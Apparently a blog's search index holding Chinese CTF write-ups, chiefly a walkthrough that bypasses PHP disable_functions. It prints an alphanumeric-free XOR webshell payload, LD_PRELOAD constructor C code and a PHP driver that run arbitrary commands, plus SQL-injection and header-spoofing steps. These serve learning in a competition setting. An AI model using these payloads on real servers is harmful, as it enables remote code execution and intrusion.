<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2019/10/30/bypass-disable-functions/</url>
    <content><![CDATA[<h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="绕过-amp-获取shell"><a href="#绕过-amp-获取shell" class="headerlink" title="绕过&amp;获取shell"></a>绕过&amp;获取shell</h3><p><img src="/2019/10/30/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>根据代码要求：</p><ol>
<li><p>长度不能大于40</p>
</li>
<li><p>不能包含大小写字母，数字</p>
</li>
</ol><p>在PHP中两个字符异或可以得到另外一个字符，例如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/30/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>利用这点我们就能绕过对字母数字的过滤</p><p>之后我们要绕过对长度的限制，40字符实在是限制太大了</p><a id="more"></a>








<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //构造payload执行php函数</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p>
<p>接着构造payload让蚁剑来连</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p>
<p><img src="/2019/10/30/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p>
<p>flag只有root权限才能访问，readflag估计是用来读flag的。</p>
<p>直接在虚拟终端中执行readflag命令</p>
<p><img src="/2019/10/30/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
<p>发现命令都无法执行，查看phpinfo()；估计是调用系统命令的函数被禁用了</p>
<p> <img src="https://asscreed.github.io/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/1571499768310.png" alt="1571499768310"> </p>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions  限制执行操作系统命令的方式为：</p>
<ul>
<li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
<li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li>
<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步  LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名  getuid() 所劫持；</li>
<li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li>
</ul>
<h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p>
<p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</span><br></pre></td></tr></table></figure>

<p>evil.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">true<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p>
<p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail  程序会调用该函数（当然也可以为其他被调用的系统函数）</p>
<p>但是这种劫持函数的做法有很大的缺陷：</p>
<p>​    一是，某些环境中，web 禁止启用  senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改  php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进  hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入  hosts（如，127.0.0.1    lamp、lamp.、lamp.com） </p>
<h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了 </p>
<p> GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。 </p>
<p> 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>如</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="劫持系统函数绕过disable-functions"><a href="#劫持系统函数绕过disable-functions" class="headerlink" title="劫持系统函数绕过disable_functions"></a>劫持系统函数绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
<p> <img src="https://asscreed.github.io/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/1571502795907.png" alt="1571502795907"></p>
<p>bypass.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<p>bypass.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/bypass-disable-functions/image-20191030182559041.png" alt="image-20191030182559041"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>disable_functions</tag>
        <tag>putenv()</tag>
      </tags>
  </entry>
  <entry>
    <title>第十届极客大挑战Write-up</title>
    <url>/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#1-打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="1.打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>1.打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="2-你看见过我的菜刀么"><a href="#2-你看见过我的菜刀么" class="headerlink" title="2.你看见过我的菜刀么"></a>2.你看见过我的菜刀么</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>











<h2 id="3-BurpSuiiiiiit-拿起你的burp，开始战斗吧"><a href="#3-BurpSuiiiiiit-拿起你的burp，开始战斗吧" class="headerlink" title="3.BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧"></a>3.BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧</h2><p>附件下载下来，解压得到Extender.jar文件</p>
<p>从名字和格式看应该BurpSuit的扩展包，用BP导入</p>
<p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571495641219.png" alt="1571495641219"></p>
<p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571374457080.png" alt="1571374457080"><br>​<br>​              导入失败，并提示我们查看errors页面<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374537984.png" alt="1571374537984"></p>
<p>​        flag直接就出来了</p>
<h2 id="4-性感潇文清，在线算卦：动作快点才能算到好卦。"><a href="#4-性感潇文清，在线算卦：动作快点才能算到好卦。" class="headerlink" title="4.性感潇文清，在线算卦：动作快点才能算到好卦。"></a>4.性感潇文清，在线算卦：动作快点才能算到好卦。</h2><p>输入姓名和生日后，返回了一个路径</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571374815419.png" alt="1571374815419"></p>
<p>直接访问试下</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571374878503.png" alt="1571374878503"></p>
<p>回到主页，查看源码</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571374951634.png" alt="1571374951634"></p>
<p>提示我们条件竞争，从源码看我们输入u和p后，flag会写入到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>​        0.1s后再把flag换成 you are too slow</p>
<p>​        所以我们先一直访问存在flag的这个文件，然后在提交u和p，在flag生成的一瞬间把它读取</p>
<p>​        直接上burpsuit</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375619875.png" alt="1571375619875"></p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571376044998.png" alt="1571376044998"></p>
<p>​    payload设置为空，数量200个。</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375724646.png" alt="1571375724646"></p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375756868.png" alt="1571375756868"></p>
<p>​    payload同样为空，数量为1.</p>
<p>​    2攻击后，3立马攻击</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375974330.png" alt="1571375974330"></p>
<p>​    得到flag</p>
<h2 id="5-Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"><a href="#5-Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！" class="headerlink" title="5.Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"></a>5.Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571386357741.png" alt="1571386357741"></p>
<p>什么防护都没有 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571387426532.png" alt="1571387426532">    </p>
<p>直接进后台</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571387449879.png" alt="1571387449879"></p>
<h2 id="6-RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me"><a href="#6-RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="6.RCE me: I don’t think U can system RCE, prove to me"></a>6.RCE me: I don’t think U can system RCE, prove to me</h2><p>这道题学到了很多！</p>
<p>打开网页看看</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571495997995.png" alt="1571495997995"></p>
<p>GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
<p>所以我们要先绕过这个限制，执行命令。</p>
<p>参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">p神</a>不含数字和字母的webshell</p>
<p>构造如下URl</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571497597408.png" alt="1571497597408"></p>
<p>查看某些关键参数</p>
<ul>
<li>​    如系统信息</li>
</ul>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571499066521.png" alt="1571499066521"></p>
<ul>
<li>disable_functions</li>
</ul>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571499768310.png" alt="1571499768310"></p>
<p>命令执行函数都被禁止了</p>
<ul>
<li>allow_url_*</li>
</ul>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571498825445.png" alt="1571498825445"></p>
<p>关于这两个参数可以参考这篇文章<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">php伪协议</a></p>
<ul>
<li>sendmail_*</li>
</ul>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571499021494.png" alt="1571499021494"></p>
<ul>
<li>open_basedir</li>
</ul>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571500306817.png" alt="1571500306817"></p>
<p>并没有限制我们目录。如果有可以参考这篇<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">文章</a>绕过</p>
<p>既然不能执行命令那就用var_dump(scandir())来查看文件信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571501644752.png" alt="1571501644752"></p>
<p>但感觉挺麻烦的，后面队友搞了个这个(躺着真舒服 )，直接蚁剑连(菜刀不行)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502520704.png" alt="1571502520704"></p>
<p>发现主目录下有有flag和readflag，flag只能root才能查看</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502747158.png" alt="1571502747158"></p>
<p>把readflag下载下来，反编译了一下</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502795907.png" alt="1571502795907"></p>
<p>那么思路也就清晰起来了，bypass disable_functions  执行readflag</p>
<p>我们这里利用的劫持库函数，从而执行命令</p>
<p>具体原理看看<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">出题人的博客</a>和<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>首先上传恶意so文件，上面的github项目中有，注意操作系统位数</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503296101.png" alt="1571503296101"></p>
<p>并且重命名为123.so</p>
<p>然后上传123.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后通过include()包含文件，执行系统命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503618681.png" alt="1571503618681"></p>
<h2 id="13-神秘的三叶草"><a href="#13-神秘的三叶草" class="headerlink" title="13.神秘的三叶草"></a>13.神秘的三叶草</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
<p>查看源码，发现Secret.php</p>
<p>打开Secret.php</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215545399.png" alt="image-20191029215545399"></p>
<p>直接BP抓包，修改Referer头</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029220046452.png" alt="image-20191029220046452"></p>
<p>提示使用Syclover浏览器</p>
<p>修改UA头</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029220217949.png" alt="image-20191029220217949"></p>
<p>接着提示只能本地读取</p>
<p>修改XFF头</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029220337766.png" alt="image-20191029220337766"></p>
<p>得到flag</p>
<h2 id="15-Jiang‘s-Secret-我在那放了一个秘密！"><a href="#15-Jiang‘s-Secret-我在那放了一个秘密！" class="headerlink" title="15. Jiang‘s Secret:我在那放了一个秘密！"></a>15. Jiang‘s Secret:我在那放了一个秘密！</h2><p>打开主页</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231444787.png" alt="image-20191029231444787"></p>
<p>查看源码</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231426639.png" alt="image-20191029231426639"></p>
<p>访问Archive_room.php</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231626206.png" alt="image-20191029231626206"></p>
<p>点击SECRET</p>
